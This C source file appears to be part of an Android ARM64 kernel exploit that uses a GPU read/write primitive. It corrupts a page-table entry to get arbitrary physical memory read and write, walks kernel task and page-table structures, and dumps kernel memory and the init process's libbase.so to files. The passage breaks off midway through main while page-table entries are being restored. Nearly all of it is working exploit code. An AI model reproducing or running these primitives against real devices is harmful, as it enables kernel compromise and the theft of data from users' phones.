static inline bool is_valid_39bit_va(uint64_t va) {
    // For 39-bit VA:
    // User space: 0x0000000000000000 - 0x0000007FFFFFFFFF
    // Kernel space: 0xFFFFFF8000000000 - 0xFFFFFFFFFFFFFFFF
    
    if (va <= 0x0000007FFFFFFFFFULL) {
        return true;  // User space
    }
    
    if (va >= 0xFFFFFF8000000000ULL) {
        return true;  // Kernel space
    }
    
    return false;  // Invalid address in the "hole"
}

uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva) {
    if (!is_valid_39bit_va(kva)) {
        fprintf(stderr, "kernel_va_to_pa: Invalid 39-bit VA: 0x%lx\n", kva);
        return 0;
    }
    
    // Always use page table walk with swapper_pg_dir
    if (cheese->swapper_pg_dir_phys == 0) {
        fprintf(stderr, "kernel_va_to_pa: swapper_pg_dir_phys not set\n");
        return 0;
    }
    
    uint64_t pte_paddr = walk_page_table_for_pte(cheese, cheese->swapper_pg_dir_phys, kva);
    if (!pte_paddr) {
        fprintf(stderr, "kernel_va_to_pa: walk_page_table_for_pte failed for kva 0x%lx\n", kva);
        return 0;
    }
    
    uint64_t pte_val = kernel_pread_u64(cheese, pte_paddr);
    if (!pte_val || (pte_val & 0x1) == 0) {
        fprintf(stderr, "kernel_va_to_pa: Invalid PTE value 0x%lx at addr 0x%lx\n", pte_val, pte_paddr);
        return 0;
    }
    
    // Extract physical address from PTE
    uint64_t pa = (pte_val & 0x0000FFFFFFFFF000ULL) | (kva & 0xFFFULL);
    
    fprintf(stderr, "kernel_va_to_pa: Page table walk: KVA 0x%lx -> PA 0x%lx (PTE=0x%lx)\n", 
            kva, pa, pte_val);
    
    return pa;
}

uint64_t get_curr_task_struct(struct cheese_gpu_rw* cheese) {
    fprintf(stderr, "get_curr_task_struct: Called with cheese: %p, init_task_phys: 0x%lx\n", cheese, cheese->init_task_phys);

    if (cheese->init_task_phys == 0) {
        fprintf(stderr, "get_curr_task_struct: cheese->init_task_phys is 0, cannot traverse task list\n");
        return 0;
    }

    uint64_t init_task_tasks_phys = cheese->init_task_phys + 0x4c8;
    uint64_t current_tasks_member_phys = init_task_tasks_phys;

    int64_t kernel_offset = 0;
    bool kernel_offset_calculated = false;
    int count = 0;

    fprintf(stderr, "Starting task list backward traversal from init_task_phys: 0x%lx\n", cheese->init_task_phys);

    do {
        uint64_t current_task_phys = current_tasks_member_phys - 0x4c8;
        fprintf(stderr, "get_curr_task_struct: Processing task at phys addr: 0x%lx (iteration %d)\n", current_task_phys, count);

        // Read PID (pid is at offset 0x5c8, but it's a 32-bit value, not 64-bit)
        uint64_t pid_addr = current_task_phys + 0x5c8;
        uint64_t pid_64 = 0;
        if (!ReadPhys64(cheese, pid_addr, &pid_64)) {
            // PID is 32-bit, so mask to get just the PID
            uint32_t pid = (uint32_t)(pid_64 & 0xFFFFFFFF);

            // Skip tasks with PID 0 after init (they're kernel threads)
            if (count > 0 && pid == 0) {
                fprintf(stderr, "Skipping kernel thread at phys: 0x%lx\n", current_task_phys);
            } else {
                fprintf(stderr, "Found task PID: %u at phys: 0x%lx\n", pid, current_task_phys);

                if (pid == (uint32_t)getpid()) {
                    fprintf(stderr, "*** Found current process (PID %u) task_struct at physical address: 0x%lx ***\n", pid, current_task_phys);
                    return current_task_phys;
                }
            }
        } else {
            fprintf(stderr, "Could not read PID for task at 0x%lx\n", current_task_phys);
        }

        // Read prev task pointer (this is a kernel VA)
        uint64_t prev_ptr_phys = current_tasks_member_phys + 8; // tasks.prev offset
        uint64_t list_entry_va = 0;
        fprintf(stderr, "get_curr_task_struct: Reading prev task pointer from: 0x%lx\n", prev_ptr_phys);
        if (ReadPhys64(cheese, prev_ptr_phys, &list_entry_va)) {
            fprintf(stderr, "Error reading prev task pointer\n");
            break;
        }

        fprintf(stderr, "Prev task VA in list: 0x%lx\n", list_entry_va);

        // Skip null or invalid pointers
        if (list_entry_va == 0) {
            fprintf(stderr, "Warning: Got null VA, list may be corrupted\n");
            break;
        }

        // Check if this looks like a kernel address
        if ((list_entry_va & 0xffffff0000000000ULL) != 0xffffff0000000000ULL) {
            fprintf(stderr, "Warning: VA 0x%lx doesn't look like a kernel address\n", list_entry_va);
            break;
        }

        // Use kernel_va_to_pa for the first conversion to establish the offset
        uint64_t list_entry_pa;
        if (!kernel_offset_calculated) {
            fprintf(stderr, "Using kernel_va_to_pa for first conversion to establish offset\n");
            list_entry_pa = kernel_va_to_pa(cheese, list_entry_va);
            if (!list_entry_pa) {
                fprintf(stderr, "Failed to convert first VA 0x%lx to PA using page tables\n", list_entry_va);
                break;
            }
            fprintf(stderr, "First conversion: VA 0x%lx -> PA 0x%lx\n", list_entry_va, list_entry_pa);

            // Calculate offset: PA = VA + offset, so offset = PA - VA
            // Use signed arithmetic to handle the subtraction properly
            kernel_offset = (int64_t)list_entry_pa - (int64_t)list_entry_va;
            kernel_offset_calculated = true;
            fprintf(stderr, "Calculated kernel offset: 0x%lx\n", (uint64_t)kernel_offset);
        } else {
            // Use the calculated offset for subsequent conversions
            list_entry_pa = (uint64_t)((int64_t)list_entry_va + kernel_offset);
            fprintf(stderr, "Converted VA 0x%lx to PA 0x%lx using offset\n", list_entry_va, list_entry_pa);
        }
        
        current_tasks_member_phys = list_entry_pa;
        count++;
    } while (current_tasks_member_phys != init_task_tasks_phys && count < 1000);

    fprintf(stderr, "get_curr_task_struct: Failed to find current task after %d iterations\n", count);
    return 0;
}

static jmp_buf env_jmp_buf;

#include <stdarg.h>

// New functions to match the user's snippet
void log_info(const char* format, ...) {
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    fprintf(stderr, "\n");
    va_end(args);
}

uint64_t kernel_vread_u64(struct cheese_gpu_rw* ctx, uint64_t kva) {
    uint64_t pa = kernel_va_to_pa(ctx, kva);
    if (!pa) {
        log_info("kernel_vread_u64: failed to convert VA %#lx to PA", kva);
        return 0;
    }
    return kernel_pread_u64(ctx, pa);
}

void kernel_write_u64(struct cheese_gpu_rw* ctx, uint64_t paddr, uint64_t val, bool ignored) {
    kernel_pwrite_u64(ctx, paddr, val);
}

uint64_t get_pgd_offset(uint64_t addr) {
    return ((addr >> 30) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pmd_offset(uint64_t addr) {
    return ((addr >> 21) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pte_offset(uint64_t addr) {
    return ((addr >> 12) & 0x1FF) * sizeof(uint64_t);
}

void flush_tlb() {
    __asm__ volatile(
        "dsb ishst\n"
        "tlbi vmalle1is\n"
        "dsb ish\n"
        "isb\n"
        : : : "memory"
    );
}

uint64_t phys_to_readwrite_pte(uint64_t pa) {
    uint64_t page_pa = pa & ~0xFFFULL;
    const uint64_t PA_FIELD_MASK = 0x0000FFFFFFFFF000ULL;
    uint64_t new_pte = (page_pa & PA_FIELD_MASK);
    new_pte |= 0x3;
    new_pte &= ~(1ULL << 7);
    new_pte |= (1ULL << 6);
    new_pte |= (1ULL << 10);
    return new_pte;
}

// Fast TLB flush using mprotect (safe and reliable)
static void flush_tlb_mprotect(void *addr, size_t len) {
    // Change protection to trigger TLB flush
    if (mprotect(addr, len, PROT_NONE) == -1) {
        perror("mprotect PROT_NONE failed");
        return;
    }
    // Restore original permissions
    if (mprotect(addr, len, PROT_READ | PROT_WRITE) == -1) {
        perror("mprotect restore failed");
    }
}

// Initialize fast read/write primitives using corrupted PTE
static int init_fast_rw(struct cheese_gpu_rw* cheese) {
    if (!cheese->garbage || !cheese->target_physical_page) {
        log_info("init_fast_rw: garbage mapping not set up");
        return 1;
    }
    
    g_fast_rw.map = (uint64_t*)cheese->garbage;
    g_fast_rw.page_map = (uint64_t*)((char*)g_fast_rw.map + PAGE_SIZE);
    g_fast_rw.pte_a_index = cheese->pte_a_index;
    
    // Read original PTE A value for restoration
    g_fast_rw.original_pte_a = g_fast_rw.page_map[g_fast_rw.pte_a_index];
    log_info("Original PTE A value: 0x%lx", g_fast_rw.original_pte_a);
    
    // Store PTE table physical address
    uint64_t pte_b_value = g_fast_rw.page_map[g_fast_rw.pte_a_index + 1];
    g_fast_rw.pte_table_pa = pte_b_value & 0x0000FFFFFFFFF000ULL;
    
    log_info("Fast RW initialized: map=%p, page_map=%p, pte_a_index=%lu, pte_table_pa=0x%lx",
             g_fast_rw.map, g_fast_rw.page_map, g_fast_rw.pte_a_index, g_fast_rw.pte_table_pa);
    
    g_fast_rw.initialized = true;
    return 0;
}

// Fast physical memory read using preserved corrupted PTE
static uint64_t fast_pread_u64(struct cheese_gpu_rw* cheese, uint64_t pa) {
    if (!g_fast_rw.initialized) {
        if (init_fast_rw(cheese)) {
            log_info("fast_pread_u64: fast RW not initialized");
            return 0;
        }
    }
    
    uint64_t target_page = pa & ~0xFFFULL;
    uint64_t offset = pa & 0xFFFULL;
    
    // Create new PTE pointing to target physical page
    uint64_t new_pte = phys_to_readwrite_pte(target_page);
    
    // Modify PTE A via page_map (which points to PTE table)
    g_fast_rw.page_map[g_fast_rw.pte_a_index] = new_pte;
    
    // Flush TLB using mprotect on the data page
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);
    
    // Read data through the map page
    uint64_t val = *(volatile uint64_t*)((char*)g_fast_rw.map + offset);
    
    // Restore original PTE A (optional, but safer for stability)
    g_fast_rw.page_map[g_fast_rw.pte_a_index] = g_fast_rw.original_pte_a;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);
    
    return val;
}

// Fast physical memory write using preserved corrupted PTE
static void fast_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t pa, uint64_t val) {
    if (!g_fast_rw.initialized) {
        if (init_fast_rw(cheese)) {
            log_info("fast_pwrite_u64: fast RW not initialized");
            return;
        }
    }
    
    uint64_t target_page = pa & ~0xFFFULL;
    uint64_t offset = pa & 0xFFFULL;
    
    // Create new PTE pointing to target physical page (writable)
    uint64_t new_pte = phys_to_readwrite_pte(target_page);
    
    // Modify PTE A via page_map
    g_fast_rw.page_map[g_fast_rw.pte_a_index] = new_pte;
    
    // Flush TLB using mprotect
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);
    
    // Write data through the map page
    *(volatile uint64_t*)((char*)g_fast_rw.map + offset) = val;
    
    // Restore original PTE A
    g_fast_rw.page_map[g_fast_rw.pte_a_index] = g_fast_rw.original_pte_a;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);
}

// Stable kernel memory dumper using fast primitives
static void dump_kernel_memory_fast(struct cheese_gpu_rw* cheese, uint64_t start_pa, uint64_t size, const char* filename) {
    FILE* f = fopen(filename, "wb");
    if (!f) {
        log_info("[-] Failed to open %s for writing", filename);
        return;
    }

    log_info("[+] Dumping %llu bytes of kernel memory from PA %#lx to %s", size, start_pa, filename);
    log_info("[+] Using fast PTE-based reads for performance");

    uint64_t bytes_dumped = 0;
    const uint64_t chunk_size = 1024 * 1024; // 1MB chunks

    for (uint64_t i = 0; i < size; i += sizeof(uint64_t)) {
        uint64_t val = fast_pread_u64(cheese, start_pa + i);
        fwrite(&val, sizeof(uint64_t), 1, f);
        
        bytes_dumped += sizeof(uint64_t);
        
        // Progress indicator every 1MB
        if (bytes_dumped % chunk_size == 0) {
            log_info("  Dumped %llu / %llu MB (%.1f%%)", 
                     bytes_dumped / (1024*1024), 
                     size / (1024*1024), 
                     (100.0 * bytes_dumped) / size);
        }
    }

    fclose(f);
    log_info("[+] Kernel dump complete. Total bytes: %llu", bytes_dumped);
}

// The stabilized exploit function (keep original but integrate fast primitives)
static int stabilize_rw(struct cheese_gpu_rw* cheese) {
    struct cheese_gpu_rw* ctx = cheese;
    
    uint64_t tsk = get_curr_task_struct(ctx);
    if (!tsk) {
        log_info("Failed to get current task_struct");
        return 1;
    }
    log_info("Current task_struct physical address: %#lx", tsk);
    
    uint64_t *map = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map == MAP_FAILED) {
        log_info("mmap of 2MB failed: %s", strerror(errno));
        return 1;
    }
    munmap((char*)map + PAGE_SIZE * 2, 0x200000 - (PAGE_SIZE * 2));
    
    uint64_t *page_map = (void *)((uint64_t)map + PAGE_SIZE);
    
    map[0] = 0x4141414141414141;
    page_map[0] = 0x4242424242424242;
    
    log_info("Mapped pages at %p and %p", map, page_map);
    
    uint64_t mm_va = kernel_pread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);
    log_info("mm_struct (kernel VA) = %#lx", mm_va);
    
    if (!mm_va) {
        log_info("mm_struct VA is NULL");
        return 1;
    }
    
    uint64_t mm_pa = kernel_va_to_pa(ctx, mm_va);
    if (!mm_pa) {
        log_info("Failed to convert mm VA %#lx to PA", mm_va);
        return 1;
    }
    log_info("mm_struct PA = %#lx", mm_pa);
    
    uint64_t mm_pgd_va = kernel_pread_u64(ctx, mm_pa + OFFSETOF_MM_PGD);
    log_info("mm_pgd (kernel VA) = %#lx", mm_pgd_va);
    
    if (!mm_pgd_va || (mm_pgd_va & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
        log_info("Invalid pgd VA: %#lx", mm_pgd_va);
        return 1;
    }
    
    uint64_t mm_pgd_pa = kernel_va_to_pa(ctx, mm_pgd_va);
    if (!mm_pgd_pa) {
        log_info("Failed to convert pgd VA to PA");
        return 1;
    }
    log_info("mm_pgd PA = %#lx", mm_pgd_pa);
    
    uint64_t pgd_offset = get_pgd_offset((uint64_t)map);
    uint64_t pgd_entry = kernel_pread_u64(ctx, mm_pgd_pa + pgd_offset);
    log_info("PGD entry = %#lx", pgd_entry);
    
    if ((pgd_entry & 0x3) != 0x3) {
        log_info("Invalid PGD entry");
        return 1;
    }
    
    uint64_t phys_pmd_addr = pgd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pmd_offset = get_pmd_offset((uint64_t)map);
    uint64_t pmd_entry = kernel_pread_u64(ctx, phys_pmd_addr + pmd_offset);
    log_info("PMD entry = %#lx", pmd_entry);
    
    if ((pmd_entry & 0x1) == 0 || (pmd_entry & 0x3) == 0x1) {
        log_info("Invalid or block PMD entry");
        return 1;
    }
    
    uint64_t phys_pte_addr = pmd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_offset_a = get_pte_offset((uint64_t)map);
    uint64_t pte_addr_a = phys_pte_addr + pte_offset_a;
    uint64_t pte_addr_b = pte_addr_a + 8;
    
    log_info("PTE addr A: %#lx, PTE addr B: %#lx", pte_addr_a, pte_addr_b);
    log_info("PTE table physical address: %#lx", phys_pte_addr);
    
    uint64_t pte_a = kernel_pread_u64(ctx, pte_addr_a);
    uint64_t pte_b = kernel_pread_u64(ctx, pte_addr_b);
    
    log_info("PTE A = %#lx, PTE B = %#lx", pte_a, pte_b);
    
    if (pte_a == 0 || pte_b == 0) {
        log_info("ERROR: PTE is 0");
        return 1;
    }
    
    cheese->pte_a_index = pte_offset_a / sizeof(uint64_t);
    
    uint64_t map_pte_region = (uint64_t)map & ~0x1FFFFFULL;
    uint64_t page_map_pte_region = (uint64_t)page_map & ~0x1FFFFFULL;
    if (map_pte_region != page_map_pte_region) {
        log_info("ERROR: Pages cross 2MB boundary");
        return 1;
    }
    
    uint64_t new_pte_b = (phys_pte_addr & 0x0000FFFFFFFFF000ULL) | 0x067;
    log_info("Original PTE B: %#lx", pte_b);
    log_info("New PTE B: %#lx", new_pte_b);
    
    // Store the original PTE B value for later restoration
    cheese->original_pte_b = pte_b;
    cheese->pte_addr_b = pte_addr_b;
    cheese->garbage = map;
    
    kernel_pwrite_u64(ctx, pte_addr_b, new_pte_b);
    sleep(1);
    
    uint64_t read_back_pte_b = kernel_pread_u64(ctx, pte_addr_b);
    if (read_back_pte_b != new_pte_b) {
        log_info("ERROR: PTE B corruption failed (read %#lx)", read_back_pte_b);
        return 1;
    }
    
    log_info("âœ“ PTE B corrupted successfully");
    
    if (init_fast_rw(cheese)) {
        log_info("Failed to initialize fast RW");
        kernel_pwrite_u64(ctx, pte_addr_b, pte_b); // Restore on failure
        return 1;
    }
    
    uint64_t test_val = fast_pread_u64(cheese, phys_pte_addr);
    log_info("Test read from PTE table: %#lx", test_val);
    
    return 0;
}



// Parse kernel header to determine actual image size
static int parse_kernel_header(struct cheese_gpu_rw* cheese, uint64_t kernel_base_pa, struct kernel_image_info* info) {
    // ARM64 kernel image header format (from Documentation/arm64/booting.txt)
    // Offset 0x0: magic "ARM\x64" (0x644d5241)
    // Offset 0x8: text_offset (where kernel text starts)
    // Offset 0x10: image_size (size of kernel image)
    // Offset 0x18: flags
    
    uint64_t magic_addr = kernel_base_pa;
    uint64_t magic = 0;
    
    if (ReadPhys64(cheese, magic_addr, &magic)) {
        log_info("Failed to read kernel magic");
        return 1;
    }
    
    log_info("Kernel magic: 0x%lx (expected 0x644d5241 for ARM\\x64)", magic & 0xFFFFFFFF);
    
    // Read text_offset (offset 0x8)
    uint64_t text_offset = 0;
    if (ReadPhys64(cheese, kernel_base_pa + 0x8, &text_offset)) {
        log_info("Failed to read text_offset");
        return 1;
    }
    
    // Read image_size (offset 0x10)
    uint64_t image_size = 0;
    if (ReadPhys64(cheese, kernel_base_pa + 0x10, &image_size)) {
        log_info("Failed to read image_size");
        return 1;
    }
    
    log_info("Parsed kernel header:");
    log_info("  text_offset: 0x%lx", text_offset);
    log_info("  image_size: 0x%lx (%lu MB)", image_size, image_size / (1024*1024));
    
    // Validate the values
    if (text_offset > 0x1000000 || image_size == 0 || image_size > 0x10000000) {
        log_info("Invalid kernel header values, using heuristic approach");
        return 1;
    }
    
    info->base_pa = kernel_base_pa;
    info->text_offset = text_offset;
    info->image_size = image_size;
    
    return 0;
}

// Heuristic method: scan for kernel end marker or use default size
static uint64_t estimate_kernel_size_heuristic(struct cheese_gpu_rw* cheese, uint64_t kernel_base_pa) {
    // Most Android kernels are between 20MB and 40MB
    // We'll use a safe default of 32MB if we can't determine size
    uint64_t default_size = 32 * 1024 * 1024;
    
    log_info("Using heuristic kernel size estimation");
    log_info("Default size: 0x%lx (%lu MB)", default_size, default_size / (1024*1024));
    
    return default_size;
}

// ------------------- Library Dumping Code -------------------

// Forward declarations
static uint64_t walk_page_table_for_pte_fast(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr);
static uint64_t kernel_va_to_pa_fast(struct cheese_gpu_rw* cheese, uint64_t kva);
static uint64_t fast_vread_u64(struct cheese_gpu_rw* cheese, uint64_t kva);
static void fast_vread_string(struct cheese_gpu_rw* cheese, uint64_t kva, char* buf, size_t size);
static uint64_t get_task_struct_by_pid_fast(struct cheese_gpu_rw* cheese, uint32_t target_pid);
static uint64_t get_mm_struct_from_task_fast(struct cheese_gpu_rw* cheese, uint64_t task_struct_pa);
static uint64_t translate_user_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t user_pgd_pa, uint64_t user_va);
static void find_and_dump_library(struct cheese_gpu_rw* cheese, const char* lib_name, const char* out_filename);


// Kernel structure offsets - these are best-effort guesses and may need adjustment
#define OFFSETOF_TASK_STRUCT_TASKS 0x4c8
#define OFFSETOF_TASK_STRUCT_PID 0x5c8
#define OFFSETOF_MM_MMAP 0x0
#define OFFSETOF_VMA_VM_START 0x0
#define OFFSETOF_VMA_VM_END 0x8
#define OFFSETOF_VMA_VM_NEXT 0x10
#define OFFSETOF_VMA_VM_FILE 0xA0
#define OFFSETOF_FILE_FPATH 0x10
#define OFFSETOF_PATH_DENTRY 0x8
#define OFFSETOF_DENTRY_DNAME 0x20
#define OFFSETOF_QSTR_NAME 0x8

static uint64_t walk_page_table_for_pte_fast(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr) {
    uint64_t pgd_index = (virtual_addr >> 30) & 0x1FF;
    uint64_t pgd_entry_addr = pgd_phys_addr + (pgd_index * sizeof(uint64_t));
    
    uint64_t pgd_entry_val = fast_pread_u64(cheese, pgd_entry_addr);
    if (!pgd_entry_val || (pgd_entry_val & 0x3) != 0x3) {
        return 0;
    }
    
    uint64_t pmd_addr = pgd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pmd_addr) {
        return 0;
    }
    
    uint64_t pmd_index = (virtual_addr >> 21) & 0x1FF;
    uint64_t pmd_entry_addr = pmd_addr + (pmd_index * sizeof(uint64_t));
    
    uint64_t pmd_entry_val = fast_pread_u64(cheese, pmd_entry_addr);
    if (!pmd_entry_val || (pmd_entry_val & 0x1) == 0) {
        return 0;
    }
    
    if ((pmd_entry_val & 0x3) == 0x1) { // Block mapping
        return 0;
    }
    
    uint64_t pte_addr = pmd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pte_addr) {
        return 0;
    }
    
    uint64_t pte_index = (virtual_addr >> 12) & 0x1FF;
    return pte_addr + (pte_index * sizeof(uint64_t));
}

uint64_t kernel_va_to_pa_fast(struct cheese_gpu_rw* cheese, uint64_t kva) {
    if (!is_valid_39bit_va(kva)) {
        return 0;
    }
    
    if (cheese->swapper_pg_dir_phys == 0) {
        return 0;
    }
    
    uint64_t pte_paddr = walk_page_table_for_pte_fast(cheese, cheese->swapper_pg_dir_phys, kva);
    if (!pte_paddr) {
        return 0;
    }
    
    uint64_t pte_val = fast_pread_u64(cheese, pte_paddr);
    if (!pte_val || (pte_val & 0x1) == 0) {
        return 0;
    }
    
    return (pte_val & 0x0000FFFFFFFFF000ULL) | (kva & 0xFFFULL);
}

static uint64_t fast_vread_u64(struct cheese_gpu_rw* cheese, uint64_t kva) {
    uint64_t pa = kernel_va_to_pa_fast(cheese, kva);
    if (!pa) {
        return 0;
    }
    return fast_pread_u64(cheese, pa);
}

static void fast_vread_string(struct cheese_gpu_rw* cheese, uint64_t kva, char* buf, size_t size) {
    memset(buf, 0, size);
    for (size_t i = 0; i < size - 1; i++) {
        // This is slow, but safer than reading by chunks across page boundaries
        uint64_t char_pa = kernel_va_to_pa_fast(cheese, kva + i);
        if (!char_pa) break;
        
        uint64_t aligned_pa = char_pa & ~7ULL;
        uint64_t val = fast_pread_u64(cheese, aligned_pa);
        char c = ((char*)&val)[char_pa & 7ULL];
        
        buf[i] = c;
        if (c == '\0') return;
    }
    buf[size - 1] = '\0';
}

static uint64_t get_task_struct_by_pid_fast(struct cheese_gpu_rw* cheese, uint32_t target_pid) {
    if (cheese->init_task_phys == 0) {
        log_info("get_task_struct_by_pid_fast: init_task_phys is 0");
        return 0;
    }

    uint64_t init_task_tasks_phys = cheese->init_task_phys + OFFSETOF_TASK_STRUCT_TASKS;
    uint64_t current_tasks_member_phys = init_task_tasks_phys;
    int count = 0;

    log_info("Starting task list traversal from init_task to find PID %u", target_pid);

    do {
        uint64_t current_task_phys = current_tasks_member_phys - OFFSETOF_TASK_STRUCT_TASKS;
        
        uint64_t pid_addr = current_task_phys + OFFSETOF_TASK_STRUCT_PID;
        uint64_t pid_64 = fast_pread_u64(cheese, pid_addr);
        uint32_t pid = (uint32_t)(pid_64 & 0xFFFFFFFF);

        if (pid == target_pid) {
            log_info("Found process with PID %u at PA: %#lx", pid, current_task_phys);
            return current_task_phys;
        }

        uint64_t next_task_va = fast_pread_u64(cheese, current_tasks_member_phys); // read tasks.next
        if (!next_task_va) {
            log_info("Failed to read next task VA from PA %#lx", current_tasks_member_phys);
            break;
        }
        
        current_tasks_member_phys = kernel_va_to_pa_fast(cheese, next_task_va);
        if (!current_tasks_member_phys) {
            log_info("Failed to convert next task VA %#lx to PA", next_task_va);
            break;
        }
        
        count++;
    } while (current_tasks_member_phys != init_task_tasks_phys && count < 2000);

    log_info("Failed to find task with PID %u after %d iterations", target_pid, count);
    return 0;
}

static uint64_t get_mm_struct_from_task_fast(struct cheese_gpu_rw* cheese, uint64_t task_struct_pa) {
    uint64_t mm_field_addr = task_struct_pa + OFFSETOF_TASK_STRUCT_MM;
    uint64_t mm_struct_va = fast_pread_u64(cheese, mm_field_addr);
    
    if (!mm_struct_va) {
        log_info("get_mm_struct_from_task_fast: mm_struct VA is NULL");
        return 0;
    }
    return mm_struct_va;
}

static uint64_t translate_user_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t user_pgd_pa, uint64_t user_va) {
    uint64_t pte_paddr = walk_page_table_for_pte_fast(cheese, user_pgd_pa, user_va);
    if (!pte_paddr) {
        return 0;
    }
    uint64_t pte_val = fast_pread_u64(cheese, pte_paddr);
    if (!pte_val || (pte_val & 0x1) == 0) {
        return 0;
    }
    return (pte_val & 0x0000FFFFFFFFF000ULL) | (user_va & 0xFFFULL);
}

static void find_and_dump_library(struct cheese_gpu_rw* cheese, const char* lib_name, const char* out_filename) {
    log_info("\n[=== Finding library '%s' in init process (PID 1) ===]", lib_name);

    uint64_t init_task_pa = get_task_struct_by_pid_fast(cheese, 1);
    if (!init_task_pa) {
        log_info("Failed to find task_struct for PID 1");
        return;
    }

    uint64_t mm_va = get_mm_struct_from_task_fast(cheese, init_task_pa);
    if (!mm_va) {
        log_info("Failed to get mm_struct for PID 1");
        return;
    }
    
    uint64_t vma_va = fast_vread_u64(cheese, mm_va + OFFSETOF_MM_MMAP);
    log_info("init's mm_struct->mmap (VMA list head VA): %#lx", vma_va);

    uint64_t lib_start_va = 0;
    uint64_t lib_end_va = 0;

    int count = 0;
    while (vma_va && count < 500) {
        uint64_t file_va = fast_vread_u64(cheese, vma_va + OFFSETOF_VMA_VM_FILE);
        if (file_va) {
            uint64_t path_struct_va = file_va + OFFSETOF_FILE_FPATH;
            uint64_t dentry_va = fast_vread_u64(cheese, path_struct_va + OFFSETOF_PATH_DENTRY);
            if (dentry_va) {
                uint64_t name_ptr_va = fast_vread_u64(cheese, dentry_va + OFFSETOF_DENTRY_DNAME + OFFSETOF_QSTR_NAME);
                if (name_ptr_va) {
                    char name_buf[256];
                    fast_vread_string(cheese, name_ptr_va, name_buf, sizeof(name_buf));
                    
                    if (strlen(name_buf) > 0 && strstr(name_buf, lib_name) != NULL) {
                         log_info("Found VMA with matching name: '%s' at VA %#lx", name_buf, vma_va);
                         
                         uint64_t vm_start = fast_vread_u64(cheese, vma_va + OFFSETOF_VMA_VM_START);
                         uint64_t vm_end = fast_vread_u64(cheese, vma_va + OFFSETOF_VMA_VM_END);
                         log_info("  VMA range: %#lx - %#lx", vm_start, vm_end);

                         if (lib_start_va == 0 || vm_start < lib_start_va) {
                             lib_start_va = vm_start;
                         }
                         if (vm_end > lib_end_va) {
                             lib_end_va = vm_end;
                         }
                    }
                }
            }
        }

        vma_va = fast_vread_u64(cheese, vma_va + OFFSETOF_VMA_VM_NEXT);
        count++;
    }

    if (lib_start_va == 0) {
        log_info("Library '%s' not found in init process memory maps.", lib_name);
        return;
    }

    uint64_t lib_size = lib_end_va - lib_start_va;
    log_info("Full library VA range: %#lx - %#lx, size: %#lx", lib_start_va, lib_end_va, lib_size);

    uint64_t mm_pa = kernel_va_to_pa_fast(cheese, mm_va);
    uint64_t init_pgd_va = fast_pread_u64(cheese, mm_pa + OFFSETOF_MM_PGD);
    uint64_t init_pgd_pa = kernel_va_to_pa_fast(cheese, init_pgd_va);
    if (!init_pgd_pa) {
        log_info("Failed to get PGD for init process");
        return;
    }

    FILE* f = fopen(out_filename, "wb");
    if (!f) {
        log_info("Failed to open %s for writing", out_filename);
        return;
    }

    log_info("Dumping %llu bytes to %s...", lib_size, out_filename);
    for (uint64_t va = lib_start_va; va < lib_end_va; va += sizeof(uint64_t)) {
        uint64_t pa = translate_user_va_to_pa(cheese, init_pgd_pa, va);
        uint64_t val = 0;
        if (pa) {
            val = fast_pread_u64(cheese, pa);
        }
        fwrite(&val, sizeof(uint64_t), 1, f);
    }
    fclose(f);
    log_info("Library dump complete.");
}








static void maybe_retry(char** argv) {
    char* attempt = getenv("CHEESE_ATTEMPT");
    int attempt_num = attempt? atoi(attempt): 0;
    int new_attempt = attempt_num + 1;
    if (new_attempt < sizeof(gPhyAddrs) / sizeof(*gPhyAddrs)) {
        char new_attempt_str[10];
        snprintf(new_attempt_str, sizeof(new_attempt_str), "%d", new_attempt);
        setenv("CHEESE_ATTEMPT", new_attempt_str, true);
        execv("/proc/self/exe", argv);
    }
}

int main(int argc, char** argv) {
    g_level1_dcache_size = tu_get_l1_dcache_size();
    fprintf(stderr, "Current process PID: %d\n", getpid());
    
    if (!getenv("CHEESE_SKIP_GPU")) {
        struct cheese_gpu_rw cheese = {};
        cheese.fd = 0;
        cheese.ctx_id = 0;
        cheese.payload_buf = NULL;
        cheese.payload_gpuaddr = 0;
        cheese.output_buf = NULL;
        cheese.output_gpuaddr = 0;
        cheese.target_physical_page = NULL;
        cheese.phyaddr = 0;
        cheese.garbage = NULL;
        cheese.swapper_pg_dir_phys = 0;
        cheese.init_task_phys = 0;
        cheese.pte_a_index = 0;
        cheese.pte_addr_b = 0;
        cheese.original_pte_b = 0;
        cheese.kernel_base_pa = 0;
        cheese.kernel_size = 0;
        
        if (cheese_gpu_rw_setup(&cheese)) {
            fprintf(stderr, "can't get GPU r/w\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }
        
        if (stabilize_rw(&cheese) != 0) {
            fprintf(stderr, "Failed to stabilize r/w\n");
            return 1;
        }



        find_and_dump_library(&cheese, "libbase.so", "libbase.so.dump");





        log_info("[=== Preparing PTE restoration ===]");
        
        // Use the original PTE values that were stored during stabilization
        uint64_t original_pte_a = g_fast_rw.original_pte_a;
        uint64_t original_pte_b = cheese.original_pte_b;  // The original value before corruption
        uint64_t pte_b_index = cheese.pte_a_index + 1;

        log_info("[=== Restoring PTEs to original state ===]");

        // Ensure all operations are completed before restoration
        __sync_synchronize();
        
        // Restore PTE A first, then PTE B to relinquish page table access last.
        g_fast_rw.page_map[g_fast_rw.pte_a_index] = original_pte_a;
        __sync_synchronize();
        usleep(50000); // 50ms delay for stability
        
